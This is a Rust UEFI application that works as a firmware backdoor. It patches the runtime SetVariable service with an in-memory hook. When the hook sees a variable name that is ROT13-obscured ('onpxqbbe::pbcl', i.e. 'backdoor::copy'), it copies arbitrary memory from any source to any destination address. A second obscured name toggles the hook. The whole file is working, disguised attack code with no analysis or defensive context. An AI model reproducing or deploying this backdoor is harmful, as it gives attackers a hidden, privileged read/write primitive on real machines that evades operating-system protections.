#![no_std]
#![no_main]
#![feature(abi_efiapi)]

extern crate panic_abort;

#[macro_use]
mod util;
use util::*;

use core::mem;
use ezhook::remote_hook;
use uefi::{prelude::*, table::boot::Tpl, Guid};

remote_hook! {
    #[hook]
    unsafe extern "efiapi" fn set_variable_hook(
        variable_name: *const u16,
        vendor_guid: *const Guid,
        attributes: u32,
        data_size: usize,
        data: *const u8,
    ) -> Status {
        if !variable_name.is_null() {
            if eq(variable_name, &COPY_VARIABLE_NAME) {
                if data_size == mem::size_of::<CopyData>() {
                    copy(&*(data as *const CopyData));
                }

                return Status::SUCCESS
            }

            if eq(variable_name, &UNHOOK_VARIABLE_NAME) {
                toggle!();

                return Status::SUCCESS
            }

            // TODO: store the remote location for proper unhooking
        }

        orig!(variable_name, vendor_guid, attributes, data_size, data)
    }

    unsafe fn eq(a: *const u16, b: &[u8]) -> bool {
        b.iter().enumerate().all(|(n, i)| *a.add(n) == *i as u16)
    }

    static COPY_VARIABLE_NAME: [u8; 15] = *b"onpxqbbe::pbcl\0";

    #[repr(C)]
    struct CopyData {
        src: *const u8,
        dst: *mut u8,
        count: usize,
    }

    unsafe fn copy(data: &CopyData) {
        for i in 0..data.count {
            *data.dst.add(i) = *data.src.add(i);
        }
    }

    static UNHOOK_VARIABLE_NAME: [u8; 17] = *b"onpxqbbe::haubbx\0";
}

fn main() -> Status {
    let set_variable = raw_runtime_services().set_variable;
    println!("[+] set_variable = {:x}", set_variable as usize);

    let region = unwrap!(region_containing(set_variable as _));
    println!("[+] region = {:x}:{:x}", region.start, region.end);
    let region = unsafe { range_to_slice(region) };

    let location = unwrap!(search_for_contiguous(region, 0, unsafe {
        set_variable_hook::len()
    }));
    let start = location.as_ptr() as usize;
    println!("[+] location = {:x}:{:x}", start, start + location.len());

    unsafe {
        let hook = set_variable_hook::copy_to(location);
        hook.hook(mem::transmute(set_variable));

        let guard = system_table().boot_services().raise_tpl(Tpl::NOTIFY);
        hook.toggle();
        mem::drop(guard);
    }

    Status::SUCCESS
}
